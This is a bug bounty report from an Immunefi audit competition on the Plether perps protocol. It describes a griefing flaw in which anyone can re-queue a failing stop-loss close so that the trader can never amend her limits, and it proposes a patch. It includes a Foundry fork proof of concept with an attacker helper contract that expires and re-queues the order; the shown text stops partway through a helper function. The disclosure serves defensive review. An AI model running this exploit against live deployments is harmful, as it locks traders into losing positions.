# \#98145 [SC-High] # Permissionless `retryPositionProtectionClose()` lets anyone block a non-batched `amendLatchedPositionProtectionCloseLimits()` and hold a failing stop open

**Submitted on Nov 5th 2026 at 13:10:53 UTC by @EagleEye for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98145
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

The MED-9 fix stores a trader's own close ceilings on each stop-loss/take-profit, and its one remedy for a close that keeps failing on them is the owner's `amendLatchedPositionProtectionCloseLimits()`. That call needs the protection `Latched` with an empty queue ([PositionProtectionBook.sol#L315-L327](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L327)). `retryPositionProtectionClose()` has no caller check and moves it straight back to `Triggered` with a new child ([#L382-L405](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L405)). Any address can end each failing child and re-queue the next, atomically or in the sequencer round after someone else ends it. A trader who amends with the documented single call is then refused every time, while every other exit is closed: she is denied the exit she authorised until the price recovers or she is liquidated. In the fork PoC's adverse scenario this costs her **872.43 USDG** more on a 96,763.599 USDG position; the attacker pays about 0.00044 ETH of gas. Impact: Griefing (Medium).

## Vulnerability Details

**The remedy and its preconditions.** After MED-9 every protection carries the trader's ceilings (`maxExecutionNotionalAssets`, `maxGrossAccountDebitAssets`, `maxActionChargeAssets`, `maxExplicitFeesAssets`), and every trigger or retry copies them into the child's bounds ([OrderLiquidationBatchLogic.sol#L657-L680](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L657-L680)). When a price gap pushes the child past a ceiling, the policy evaluator rejects it as `ConstraintViolation`, `OrderRouter._settleTerminalBounty()` calls `handleFailedProtectionAttempt()` ([OrderRouter.sol#L328](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L328)). The book then sets the status to `Latched` ([PositionProtectionBook.sol#L666](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L666)). Expiry relatches the same way. The Cecuro MED-9 response names the owner's amend of a `Latched` protection as the way out when the ceilings block execution. The amend checks:

- `protection.status == Latched`, else `OrderRouter__ProtectionNotLatched` ([#L320-L321](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L320-L321));
- `pendingOrderCounts(msg.sender) == 0`, else `OrderRouter__PendingOrdersExist` ([#L323-L325](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L323-L325)).

**Root cause: anyone can take the `Latched` state away first.** `retryPositionProtectionClose()` resolves the protection with `_activeProtection()` ([#L385](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L385), [#L993-L1000](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L993-L1000)), which never checks the caller. It needs only `Latched` and an empty queue, commits a fresh zero-bounty child and `_recordCloseAttempt()` sets `Triggered` ([#L573](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L573)). It copies the same stale ceilings. `OrderRouter.expireOrder()` ([OrderRouter.sol#L191](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L191)) and `OrderRouter.executeOrder()` ([#L240](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L240)) are permissionless too. The release execution window is 60 s (`DEFAULT_MAX_EXECUTION_WINDOW_SECONDS`, [OrderExecutionOrchestrator.sol#L11](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderExecutionOrchestrator.sol#L11)). A contract can expire the child after that window, or execute it, and call `retryPositionProtectionClose()` in the same transaction, so no transaction boundary shows the owner `Latched`. When a keeper or the trader ends the child in a separate transaction, the attacker's bot sees the relatch in the sequencer feed and retries in the next round, before the trader's amend.

**Every other exit is closed for a `Triggered`/`Latched` protection:**

- `cancelPositionProtection()` → `_cancel()` accepts only `PendingOpen`/`Armed` ([#L408-L420](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L408-L420));
- `cancelPositionProtectionAndCommitClose()` accepts only `Armed` ([#L341-L348](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L341-L348));
- `replacePositionProtection()` accepts only `PendingOpen`/`Armed` ([#L271-L276](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L271-L276));
- `OrderRouter.commitOrder()` reverts `OrderRouter__ProtectionActive` while any protection is active ([OrderLiquidationBatchLogic.sol#L313-L315](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L315)).

**Pre-conditions**

1. The trader has a stop-loss whose stored ceiling a price gap exceeds. Ceilings are the trader's own MED-9 parameters; the PoC uses a notional ceiling 1.2% above entry and a 1.5% gap. The frozen-close spread (0.50%) or fees can breach `maxExplicitFeesAssets` the same way.
2. The basket stays above the ceiling; the damage needs it to keep moving against her.
3. The trader amends with the documented single call (as the shipped client's `buildAmendLatchedProtectionCloseLimitsAction` builds it), alone or after ending the child herself in a separate transaction.
4. Ordering for the reactive case: a retry sent when the relatch appears in the Arbitrum One sequencer feed is included before a trader transaction that is only sent after she sees the relatch. The atomic case (attacker ends the child and retries in one transaction) needs no ordering assumption.
5. PoC set-up: Pyth (out of scope) is the repository's `MockPyth` seeded with the real stored prices at the fork block; the ArbSys precompile (0x64, out of scope) returns the rolled L2 block; USDG is dealt to the trader only. `keeper` and `attacker` are fresh addresses calling permissionless functions. The PoC forks the deployed v2.0.0 stack rather than the repository's `BasePerpTest`, so every in-scope contract runs as deployed.

**Who escapes.** The lock is reliable only against a trader who amends after observing the relatch. A trader who ends the child and amends in one transaction (a trading account's `SimpleAccount.executeBatch`) or in the same sequencer round escapes, unless the attacker itself ends and re-queues the child every second (a retried child is executable from the next second, [PletherOracle.sol#L610](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L610)) and wins the ordering of every round. At the measured 1,118,731 gas per atomic cycle (mock Pyth, a lower bound), preempting every second over the PoC's 2,958 s costs at least 3.3e9 gas, about 0.033 ETH at 0.01 gwei, before priority fees. The documented flow does not batch: the docs describe the amend alone ([CANONICAL_ENTRYPOINTS.md](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md), Position protection).

**Not a known issue.** MED-9 is fixed; this is a new bug its fix introduces (the scope page: valid if the fix "is incomplete or introduces a new bug"). MED-30 covers the missing cancel-and-close exit for `Triggered`/`Latched`; this report shows the remaining remedy cannot be reached. SECURITY.md's "users cannot manually cancel queued intents" concerns a trader's own orders; here a third party creates the queued intent, and the trader wants the next retry's limits changed, not the order cancelled. DEPLOYMENT.md tells retry workers "do not continuously queue the same failing attempt" ([DEPLOYMENT.md](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md), Position protection keepers). The repository test `test_ProtectionCloseLimits_OnlyOwnerCanAmendLatchedLimitsForNextRetry` expects the amend to revert after one third-party retry; it records the current revert, not that a third party can repeat it without end.

## Impact Details

**Selected impact:** Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

Severity: **Medium** (Griefing). The attacker gains nothing and pays only gas. The damage is a denied exit: a trader who amends after observing the relatch cannot change her ceilings or close while the attacker keeps cycling. If the basket returns below her ceiling the stop fills normally; if it keeps moving against her, the stop she authorised becomes a liquidation. The PoC shows that adverse scenario (basket drifting 0.01% per minute).

PoC numbers (Anvil fork of Arbitrum Sepolia v2.0.0, block 326295456, release parameters):

| | Control: amend while `Latched`, stop closes at the gap | Attack: retry lock |
|---|---|---|
| Position | LONG 100,000 units, 96,763.599 USDG notional, 2,500 USDG margin (2,700 deposited) | same |
| Exit | stop-loss close at +1.5% | liquidation at +1.99% (basket 10,199 bps of entry) |
| Trader loss | 1,530.78 USDG | 2,403.21 USDG |

- Extra loss in this scenario: **872.43 USDG**, 0.90% of notional and 35% of the margin. It scales linearly with position size; the attacker's cost does not.
- The trader's amend reverted 98 of 98 times over 48 attacker cycles and 2,958 s. 49 of those were sent while a child was live and revert by design. 33 were sent right after a visible relatch (a keeper's or her own expiry), and all 33 reverted because the attacker's retry landed first. The other 16 followed the attacker's atomic expire-and-retry cycles (16 cycles, 1,118,731 gas each on average), which never show `Latched` at all.
- Attacker cost: 43,754,591 gas for all retries and cycles, about 0.00044 ETH at Arbitrum One's 0.01 gwei floor.

## Recommendation

Let the owner amend while a child is live. The live child keeps its pinned bounds and the next retry reads the amended limits, so a third party can no longer take the remedy away. The tested patch accepts `Triggered` when the only pending order is the live child:
```diff
diff --git a/packages/perps/src/PositionProtectionBook.sol b/packages/perps/src/PositionProtectionBook.sol
--- a/packages/perps/src/PositionProtectionBook.sol
+++ b/packages/perps/src/PositionProtectionBook.sol
@@ -317,12 +317,21 @@
         PositionProtectionTypes.CloseFinancialLimits calldata limits
     ) external nonReentrant {
         StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
-        if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
+        PositionProtectionTypes.PositionProtectionStatus status = protection.status;
+        uint256 pendingOrders = IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender);
+        if (status == PositionProtectionTypes.PositionProtectionStatus.Triggered) {
+            // A third party can re-queue the child at any time, so the owner must be able to amend while it is
+            // live. The live child keeps its pinned bounds; the next retry reads the amended limits.
+            if (pendingOrders != 1) {
+                revert OrderRouter__PendingOrdersExist();
+            }
+        } else if (status == PositionProtectionTypes.PositionProtectionStatus.Latched) {
+            if (pendingOrders != 0) {
+                revert OrderRouter__PendingOrdersExist();
+            }
+        } else {
             revert OrderRouter__ProtectionNotLatched();
         }
-        if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
-            revert OrderRouter__PendingOrdersExist();
-        }
         _setCloseLimits(protection, limits);
         _emitCloseLimitsUpdated(protection);
     }
```

Alternative: record the relatch time and let a non-owner retry only after a grace window (for example `maxExecutionWindowSeconds`).

With this patch the PoC fails at `alice could never amend her latched close ceilings` (0 of 98 amends revert) and its control passes. In test/perps/spec/trader/PositionProtection.t.sol 103 of 104 tests pass; the one failure, `test_ProtectionCloseLimits_OnlyOwnerCanAmendLatchedLimitsForNextRetry`, asserts the revert this report describes.

## Proof of Concept

## Proof of Concept

### Attack path

1. Alice opens a LONG of 100,000 units (96,763.599 USDG notional) with 2,500 USDG margin; a keeper fills it.
2. Alice arms a stop-loss 1.0% above entry with a close-notional ceiling 1.2% above entry (`createPositionProtection`).
3. The basket gaps 1.5% above entry; a keeper calls `triggerPositionProtection()` and the zero-bounty child is queued (`Triggered`).
4. A keeper executes the child at the gapped tick; it fails `ConstraintViolation` on Alice's ceiling and the protection relatches (`Latched`, empty queue). Control branch: Alice amends here, a keeper retries, and the stop closes at the gap (loss 1,530.78 USDG).
5. The attacker sees the relatch and calls `retryPositionProtectionClose()` first; Alice's `amendLatchedPositionProtectionCloseLimits()` reverts `ProtectionNotLatched`.
6. Alice's other exits revert: `cancelPositionProtection` and `cancelPositionProtectionAndCommitClose` (`ProtectionNotArmed`), `commitOrder` close (`ProtectionActive`).
7. Cycles of ~61 s while the basket drifts 0.01% per cycle. At each deadline the child ends by (a) the attacker's `expireOrder` + retry in one transaction, (b) a keeper's `expireOrder`, or (c) Alice's own `expireOrder`; in (b) and (c) the attacker's retry lands before Alice's amend.
8. At +1.99% any keeper liquidates Alice. Her loss is 2,403.21 USDG, 872.43 USDG more than the amended exit. Her amend reverted 98 of 98 times over 2,958 s, including all 33 attempts sent right after a visible relatch.

Add the test at the path shown in the command, then run:
```bash
# Local fork of Arbitrum Sepolia (chain id 421614) at block 326295456, Plether Perps v2.0.0 (USDG).
# Read-only RPC; nothing is sent to the public network. Any archive RPC endpoint works.
ARB_SEPOLIA_RPC_URL=<arbitrum-sepolia-archive-rpc-url> forge test --match-path test/F001_Permissionless.t.sol --match-test test_F001_poc -vvv

# Same test against a local Anvil fork:
anvil --fork-url <arbitrum-sepolia-archive-rpc-url> --fork-block-number 326295456 --chain-id 421614 &
ARB_SEPOLIA_RPC_URL=http://127.0.0.1:8545 forge test --match-path test/F001_Permissionless.t.sol --match-test test_F001_poc -vvv
```
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// Permissionless `retryPositionProtectionClose()` in `PositionProtectionBook` lets any caller block `amendLatchedPositionProtectionCloseLimits()` and hold a failing stop-loss open
// Chain: Arbitrum Sepolia (chain id 421614), Plether Perps v2.0.0 (USDG). Addresses: deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/addresses.env.
// Run: ARB_SEPOLIA_RPC_URL=<archive rpc url> forge test --match-path test/F001_Permissionless.t.sol --match-test test_F001_poc -vvv
//   or against a local Anvil fork: anvil --fork-url <archive rpc url> --fork-block-number <FORK_BLOCK> &
//                                  ARB_SEPOLIA_RPC_URL=http://127.0.0.1:8545 forge test --match-path test/F001_Permissionless.t.sol ...
// LOCAL FORK ONLY (Immunefi PoC rules): the RPC is read-only. Never vm.broadcast, cast send or --broadcast:
// a transaction on mainnet or a public testnet means an immediate, permanent Immunefi ban.

import {Test, console} from "forge-std/Test.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineCore} from "@plether/perps/interfaces/ICfdEngineCore.sol";
import {IMarginClearinghouse} from "@plether/perps/interfaces/IMarginClearinghouse.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPerpsKeeper} from "@plether/perps/interfaces/IPerpsKeeper.sol";
import {IPerpsTraderActions} from "@plether/perps/interfaces/IPerpsTraderActions.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {IPyth, PythStructs} from "@plether/shared/interfaces/IPyth.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @dev Public Router getters and the permissionless mark refresh (not all on the trader/keeper interfaces).
interface IRouterF001 {
    function nextExecuteId() external view returns (uint64);
    function pletherOracle() external view returns (address);
    function positionProtectionBook() external view returns (address);
    function maxExecutionWindowSeconds() external view returns (uint256);
    function pendingOrderCounts(address account) external view returns (uint256);
    function updateMarkPrice(bytes[] calldata pythUpdateData) external payable;
}

interface IPythFeeF001 {
    function singleUpdateFeeInWei() external view returns (uint256);
}

interface IOracleFeedsF001 {
    function pythFeedIds(uint256 index) external view returns (bytes32);
    function inversions(uint256 index) external view returns (bool);
}

interface IArbSysBlockF001 {
    function arbBlockNumber() external view returns (uint256);
}

/// @dev The attacker's helper. Both entry points are permissionless on the deployed Router and Book: it ends the
///      trader's failing protection child and queues a fresh one in the same transaction, so no transaction boundary
///      ever shows the trader `Latched` with an empty queue.
contract RetryGriefer {
    IPerpsKeeper internal immutable router;
    IPositionProtectionActions internal immutable book;

    constructor(address router_, address book_) {
        router = IPerpsKeeper(router_);
        book = IPositionProtectionActions(book_);
    }

    function expireAndRetry(uint64 childId, uint64 protectionId) external returns (uint64 nextChildId) {
        router.expireOrder(childId);
        nextChildId = book.retryPositionProtectionClose(protectionId);
    }
}

contract F001_Permissionless is Test {
    // Pinned Arbitrum Sepolia block (2026-11-05 12:24:08 UTC, a Thursday: FX market open), after deployment block 323658447.
    uint256 internal constant FORK_BLOCK = 326_295_456;

    // Deployed v2.0.0 addresses (addresses.env). Deployed from 1209ca8a; packages/perps/src is identical at scope a82d4fef.
    address internal constant ROUTER = 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444;
    address internal constant ORACLE = 0x4f2c62A0E03657F52C633c19c11f88d8F0897Bb2;
    address internal constant ENGINE = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address internal constant CLEARINGHOUSE = 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A;
    address internal constant LIFECYCLE_BOOK = 0x327d5fd04e17D96DD5C4F845A0b4256A9e19645C;
    address internal constant PROTECTION_BOOK = 0x81E3b03Cf29865b6c0f85925839567e2Bc61073D;
    address internal constant USDG = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
    // Pyth contract the deployed oracle reads (out of scope; replaced below by the repo's own MockPyth).
    address internal constant PYTH = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;

    // Scenario (USDG has 6 decimals; prices are 8-decimal basket units; bps of the fork's stored basket).
    uint256 internal constant SIZE = 100_000e18; // ~96,800 USDG notional at the fork's ~0.968 basket
    uint256 internal constant MARGIN = 2_500e6; // ~39x leverage (release initial margin 0.2% allows up to 500x)
    uint256 internal constant DEPOSIT = 2_700e6; // margin + execution fee + trigger bounty headroom
    uint256 internal constant STOP_BPS = 10_100; // stop-loss 1.0% above entry (LONG loses when the basket rises)
    uint256 internal constant CEILING_BPS = 10_120; // alice accepts a close notional up to 1.2% above entry
    uint256 internal constant GAP_BPS = 10_150; // the basket gaps 1.5% above entry, past her ceiling
    uint256 internal constant DRIFT_BPS_PER_CYCLE = 1; // then drifts 0.01% per ~61 s cycle (~0.6% per hour)
    uint256 internal constant MAX_CYCLES = 300;

    IPerpsTraderActions internal router = IPerpsTraderActions(ROUTER);
    IPerpsKeeper internal keeperRouter = IPerpsKeeper(ROUTER);
    IRouterF001 internal routerViews = IRouterF001(ROUTER);
    IPletherOracle internal oracle = IPletherOracle(ORACLE);
    ICfdEngineCore internal engine = ICfdEngineCore(ENGINE);
    IOrderLifecycleBook internal lifecycle = IOrderLifecycleBook(LIFECYCLE_BOOK);
    IPositionProtectionActions internal protection = IPositionProtectionActions(PROTECTION_BOOK);
    IPositionProtectionViews internal protectionViews = IPositionProtectionViews(PROTECTION_BOOK);
    IMarginClearinghouse internal clearinghouse = IMarginClearinghouse(CLEARINGHOUSE);
    MockPyth internal pyth = MockPyth(PYTH);

    address internal alice = makeAddr("alice"); // trader with a stop-loss and her own close ceilings
    address internal attacker = makeAddr("attacker"); // any address; pays gas only
    address internal keeper = makeAddr("keeper"); // any order executor / liquidator

    bytes32[] internal feedIds;
    bool[] internal inverted;
    PythStructs.Price[] internal storedAtFork;
    uint256 internal pythFee;
    uint256 internal l2Offset;
    RetryGriefer internal griefer;

    function setUp() public {
        vm.createSelectFork(vm.envString("ARB_SEPOLIA_RPC_URL"), FORK_BLOCK);
        assertEq(block.chainid, 421614, "not Arbitrum Sepolia");

        // Drift guard: the live deployment state this PoC relies on.
        assertEq(routerViews.pletherOracle(), ORACLE, "router oracle drifted");
        assertEq(routerViews.positionProtectionBook(), PROTECTION_BOOK, "protection book drifted");
        assertEq(address(oracle.pyth()), PYTH, "oracle Pyth drifted");
        assertFalse(oracle.isOracleFrozen(), "fork block must be a live (unfrozen) market");
        assertEq(routerViews.maxExecutionWindowSeconds(), 60, "release execution window (60 s) drifted");
        assertEq(oracle.orderSettlementWindow(), 15, "orderSettlementWindow drifted");
        assertEq(routerViews.nextExecuteId(), 0, "fork queue must be empty");
        for (uint256 i; i < 6; ++i) {
            feedIds.push(IOracleFeedsF001(ORACLE).pythFeedIds(i));
            inverted.push(IOracleFeedsF001(ORACLE).inversions(i));
        }
        // Every in-scope contract runs as DEPLOYED at FORK_BLOCK; the PoC never replaces or edits in-scope code.

        // Pyth is out of scope: replace its code with the repo's MockPyth (Pyth semantics: unique historical parse,
        // updatePriceFeeds keeps a feed only if newer). Storage starts from the REAL stored prices at FORK_BLOCK.
        pythFee = IPythFeeF001(PYTH).singleUpdateFeeInWei();
        for (uint256 i; i < 6; ++i) {
            storedAtFork.push(IPyth(PYTH).getPriceUnsafe(feedIds[i]));
        }
        vm.etch(PYTH, type(MockPyth).runtimeCode);
        for (uint256 slot; slot < 12; ++slot) {
            vm.store(PYTH, bytes32(slot), bytes32(0)); // MockPyth scalar slots only
        }
        pyth.setFee(pythFee);
        for (uint256 i; i < 6; ++i) {
            PythStructs.Price memory p = storedAtFork[i];
            pyth.setPrice(feedIds[i], p.price, p.conf, p.expo, p.publishTime);
            assertLe(p.publishTime, block.timestamp, "real stored Pyth time must not be in the future");
        }

        // USDG is out of scope (MockUSDG on the testnet deployment): deal to the trader only.
        deal(USDG, alice, DEPOSIT);
        vm.startPrank(alice);
        IERC20(USDG).approve(CLEARINGHOUSE, DEPOSIT);
        clearinghouse.depositFor(alice, DEPOSIT);
        vm.stopPrank();
        vm.deal(keeper, 1 ether);
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        griefer = new RetryGriefer(ROUTER, PROTECTION_BOOK);
    }

    /// The claim, against live state at FORK_BLOCK. Must FAIL once the mitigation is applied.
    function test_F001_poc() public {
        uint64 protectionId = _openProtectAndFailFirstChild();
        uint256 snap = vm.snapshotState();

        // ---- control branch (no attacker): alice amends her ceilings while Latched, anyone retries, the stop closes.
        uint256 controlLoss = _amendAndCloseAtGap(protectionId);
        console.log("control: alice amends in the Latched window, stop closes at the gap; alice loss (USDG 1e6)", controlLoss);
        vm.revertToState(snap);

        // ---- attack branch
        // Step 5: the first child failed in a keeper's transaction, so the book shows Latched. The attacker's bot sees
        //         it in the sequencer feed and lands a retry in the next round, before alice's amend.
        uint256 attackerGas;
        uint256 gasBefore = gasleft();
        vm.prank(attacker);
        uint64 childId = protection.retryPositionProtectionClose(protectionId);
        attackerGas += gasBefore - gasleft();
        uint256 amendAttempts;
        uint256 amendReverts;
        (amendAttempts, amendReverts) = _aliceAmends(protectionId, amendAttempts, amendReverts);
        // Amends sent right after a VISIBLE relatch (someone else ended the child in a separate transaction).
        uint256 relatchAttempts = 1;
        uint256 relatchReverts = amendReverts;
        uint256 atomicGas;
        uint256 atomicCycles;

        // Step 6: alice's other exits are shut while the protection is Triggered/Latched.
        _assertOtherExitsShut(protectionId);

        // Step 7: cycles. In each ~61 s cycle alice retries the documented single-call amend while the child is live,
        //         then the child ends at its deadline in one of three ways, rotating:
        //         (a) the attacker's contract expires it and retries in one transaction (Latched never visible);
        //         (b) an honest keeper expires it, the attacker's bot retries in the next round, alice's amend follows;
        //         (c) alice expires it herself (tx1), the attacker's bot retries, alice's amend (tx2) reverts.
        //         Meanwhile the basket drifts against her until anyone can liquidate the position.
        uint64 lockStart = uint64(vm.getBlockTimestamp());
        uint256 bps = GAP_BPS;
        uint256 cycles;
        bool liquidated;
        for (; cycles < MAX_CYCLES; ++cycles) {
            uint64 commitTime = uint64(vm.getBlockTimestamp());
            bps += DRIFT_BPS_PER_CYCLE;

            _advance(commitTime + 30, 120);
            (amendAttempts, amendReverts) = _aliceAmends(protectionId, amendAttempts, amendReverts);

            // Step 8: any keeper may liquidate once the drifted basket puts the position under maintenance margin.
            vm.prank(keeper);
            (bool ok,) = ROUTER.call{value: pythFee}(
                abi.encodeCall(IPerpsKeeper.executeLiquidation, (alice, _payload(bps, commitTime + 30, commitTime + 29)))
            );
            if (ok) {
                liquidated = true;
                break;
            }

            _advance(commitTime + 61, 124);
            uint256 mode = cycles % 3;
            if (mode == 0) {
                gasBefore = gasleft();
                vm.prank(attacker);
                childId = griefer.expireAndRetry(childId, protectionId);
                attackerGas += gasBefore - gasleft();
                atomicGas += gasBefore - gasleft();
                ++atomicCycles;
            } else {
                vm.prank(mode == 1 ? keeper : alice);
                OrderV3Types.ExecutionResult memory r = keeperRouter.expireOrder(childId);
                assertEq(uint256(r.terminalReason), uint256(OrderV3Types.TerminalReason.Expired), "child expired");
                assertEq(
                    uint256(protectionViews.getPositionProtection(protectionId).status),
                    uint256(PositionProtectionTypes.PositionProtectionStatus.Latched),
                    "expiry relatches the protection"
                );
                gasBefore = gasleft();
                vm.prank(attacker);
                childId = protection.retryPositionProtectionClose(protectionId);
                attackerGas += gasBefore - gasleft();
            }
            uint256 revertsBefore = amendReverts;
            (amendAttempts, amendReverts) = _aliceAmends(protectionId, amendAttempts, amendReverts);
            if (mode != 0) {
                ++relatchAttempts;
                relatchReverts += amendReverts - revertsBefore;
            }
        }
        uint256 lockSeconds = vm.getBlockTimestamp() - lockStart;
        uint256 attackLoss = DEPOSIT - clearinghouse.balanceAssets(alice);

        // ---- damage
        assertEq(amendReverts, amendAttempts, "alice could never amend her latched close ceilings");
        assertTrue(liquidated, "alice was held in the position until liquidation");
        assertGt(attackLoss, controlLoss, "alice lost more than the amended stop-loss exit");
        (uint256 sizeAfter,,,,,,) = engine.positions(alice);
        assertEq(sizeAfter, 0, "position gone through liquidation, not through the stop");

        console.log("amend attempts by alice", amendAttempts);
        console.log("amend attempts reverted", amendReverts);
        console.log("amend attempts right after a visible relatch (keeper or alice ended the child)", relatchAttempts);
        console.log("of those reverted (attacker's retry landed first)", relatchReverts);
        console.log("attacker cycles", cycles);
        console.log("lock duration (s)", lockSeconds);
        console.log("basket at liquidation (bps of entry)", bps);
        console.log("attack: alice loss (USDG 1e6)", attackLoss);
        console.log("control: alice loss (USDG 1e6)", controlLoss);
        console.log("extra loss caused by the lock (USDG 1e6)", attackLoss - controlLoss);
        console.log("attacker gas, all retries and expire+retry calls", attackerGas);
        console.log("attacker cost in wei at 0.01 gwei (Arbitrum One floor)", attackerGas * 0.01 gwei);
        console.log("attacker atomic expire+retry cycles", atomicCycles);
        console.log("average gas per atomic expire+retry cycle", atomicGas / atomicCycles);
    }

    /// Control: the honest flow. The first child fails on alice's ceiling, she amends while Latched with no attacker,
    /// a keeper retries, and the stop-loss closes the position. Must PASS with and without the fix.
    function test_F001_control() public {
        uint64 protectionId = _openProtectAndFailFirstChild();
        uint256 loss = _amendAndCloseAtGap(protectionId);
        (uint256 sizeAfter,,,,,,) = engine.positions(alice);
        assertEq(sizeAfter, 0, "control: stop-loss closed the position");
        assertGt(loss, 0, "control: alice realised the gap loss");
        assertLt(loss, MARGIN, "control: loss below her margin");
    }

    // ------------------------------------------------------------------ shared steps

    /// @dev Steps 1-4. Returns the protection id, Latched after the first child failed on alice's own ceiling.
    function _openProtectAndFailFirstChild() internal returns (uint64 protectionId) {
        uint64 t = uint64(vm.getBlockTimestamp());

        // Step 1: alice opens LONG 100,000 units with 2,500 USDG margin; a keeper fills it at its first tick (t+1).
        OrderV3Types.OrderRequest memory open = _openRequest();
        vm.prank(alice);
        uint64 openId = router.commitOrder(open);
        _advance(t + 3, 12);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory r =
            keeperRouter.executeOrder{value: 2 * pythFee}(openId, _payload(10_000, t + 1, t));
        assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Executed), "alice's open filled");
        (uint256 size,,,,,,) = engine.positions(alice);
        assertEq(size, SIZE, "alice holds the position");
        console.log("fork block", FORK_BLOCK);
        console.log("alice position size (units, 1e18)", size / 1e18);
        console.log("alice margin (USDG 1e6)", MARGIN);
        console.log("alice deposit (USDG 1e6)", DEPOSIT);

        // Step 2: a live refresh syncs the accepted basket with the Engine mark; alice arms a stop-loss 1% above entry
        //         and caps the close notional at +1.2% (her own MED-9 ceiling).
        _advance(t + 4, 16);
        vm.prank(keeper);
        routerViews.updateMarkPrice{value: pythFee}(_payload(10_000, t + 4, t + 3));
        uint256 entryMark = engine.lastMarkPrice();
        PositionProtectionTypes.PositionProtectionParams memory params;
        params.takeProfitTriggerPrice = entryMark * 9_500 / 10_000;
        params.stopLossTriggerPrice = entryMark * STOP_BPS / 10_000;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: SIZE * entryMark * CEILING_BPS / 10_000 / 1e20,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        vm.prank(alice);
        protectionId = protection.createPositionProtection(params);
        console.log("entry mark (1e8)", entryMark);
        console.log("entry notional (USDG 1e6)", SIZE * entryMark / 1e20);
        console.log("stop-loss trigger (1e8)", params.stopLossTriggerPrice);
